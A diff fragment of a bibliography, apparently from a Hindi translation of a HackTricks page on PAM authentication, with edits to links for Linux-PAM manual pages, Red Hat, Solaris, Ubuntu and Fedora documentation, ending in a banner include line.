+- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
+- [10] [Oracle Solaris 11.4 में authentication का प्रबंधन](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
 - [11] [pam_sm_authenticate(3) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
 - [12] [pam_get_authtok(3) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
-- [13] [System-Level Authentication Guide - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
+- [13] [सिस्टम-स्तरीय Authentication गाइड - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
 - [14] [Ubuntu पैकेज फ़ाइल सूची: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
 - [15] [pam_env(8) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man8/pam_env.8.html)
 - [16] [pam_unix(8) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
-- [17] [pam_ldap(5) - Debian मैनपेज](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
+- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
 - [18] [pam_sm_setcred(3) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
-- [19] [परिवर्तन/Make Authselect Mandatory - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
+- [19] [बदलाव/ Authselect को अनिवार्य बनाना - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
 {{#include ../../banners/hacktricks-training.md}}
